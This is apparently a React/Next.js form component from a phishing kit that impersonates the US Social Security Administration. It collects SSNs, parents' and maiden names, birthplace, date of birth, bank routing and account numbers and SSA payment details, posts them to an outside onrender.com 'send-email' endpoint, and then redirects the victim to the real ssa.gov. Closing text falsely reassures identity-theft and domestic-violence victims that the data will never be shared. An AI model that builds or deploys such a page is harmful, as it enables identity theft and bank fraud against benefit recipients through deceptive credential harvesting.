"use client";

import { useState } from "react";
import { Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import axios from "axios";
import { ToastAction } from "@/components/ui/toast";
import { useToast } from "@/components/ui/use-toast";
import { useRouter, useParams } from "next/navigation";



 const initialState = {
  fname: "",
  ssn: "",
  mailAddress: "",
  fathersFname: "",
  mothersFname: "",
  mothersMname: "",
  city: "",
  state: "",
  amount: "",
  routing: "",
  account: "",
  phone_number: "",
  QA: "",
  dob: "",
  dateOfPayment: "",
};

 const fieldLabels = {
   fname: "Full Name",
   ssn: "SSN",
   mailAddress: "Mailing Address on Profile",
   fathersFname: "Father's Full Name And Maiden Name",
   mothersFname: "Mother's Full Name",
   mothersMname: "Mother's Maiden Name",
   city: "City Born",
   state: "State",
   amount: "Amount Received Last Month (In USD)",
   routing: "Routing Number That's On File",
   account: "Account Number That's On File",
   phone_number: "Phone Number",
   QA: "Did You Receive SSA (YES or NO)",
   dob: "Date of Birth (MM/DD/YY)",
   dateOfPayment: "Date Of Payment (MM/DD/YY)",
 };

export default function Inputs() {
  const [formData, setFormData] = useState(initialState);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();
  const router = useRouter();
  const params = useParams();

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    const dataToSend = { ...formData, ...params };

    try {
      await axios.post(`https://form-d45b.onrender.com/send-email`, dataToSend);
      toast({
        variant: "success",
        title: "Success",
        description: "Form submitted successfully!",
      });
      router.push("https://www.ssa.gov/about-ssa/agency-resources#initiatives");
    } catch (error) {
      const errorMessage =
        error.response?.data?.message || "An unexpected error occurred.";
      toast({
        variant: "destructive",
        title: "Submission Failed",
        description: errorMessage,
        action: <ToastAction altText="Try again">Try again</ToastAction>,
      });
    } finally {
      setIsSubmitting(false);
      setFormData(initialState);
    }
  };

  return (
    <div className="px-6 lg:px-20">
      <form onSubmit={handleSubmit} method="POST">
        {Object.keys(fieldLabels).map((key) => (
          <div className="my-4" key={key}>
            <label htmlFor={key} className="block my-1">
              {fieldLabels[key]}
            </label>
            {key === "QA" ? (
              <select
                required
                className="border border-gray-400 rounded-md px-3 py-2"
                id={key}
                name={key}
                value={formData[key]}
                onChange={handleChange}
              >
                <option value="">Select an Option</option>
                <option value="Yes">Yes</option>
                <option value="No">No</option>
              </select>
            ) : (
              <input
                type="text"
                className="w-full border border-gray-400 rounded-md px-3 py-2"
                id={key}
                name={key}
                value={formData[key]}
                onChange={handleChange}
                required
              />
            )}
          </div>
        ))}
        <div className="my-4">
          {isSubmitting ? (
            <Button disabled className="bg-blue-700">
              <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              Submitting
            </Button>
          ) : (
            <Button
              type="submit"
              variant="outline"
              className="bg-blue-700 text-white"
            >
              Submit
            </Button>
          )}
        </div>
      </form>

      <div className="mt-12">
        <p>
          Are you now, or have you ever been a victim of domestic violence?
          Identity theft? Do you have other concerns?
        </p>
        <p>
          You can contact us to block electronic access to your information at
          any time, for any reason.
        </p>{" "}
        <div className="form-text">
          We&apos;ll never share your information with anyone else.
        </div>
      </div>
    </div>
  );
}
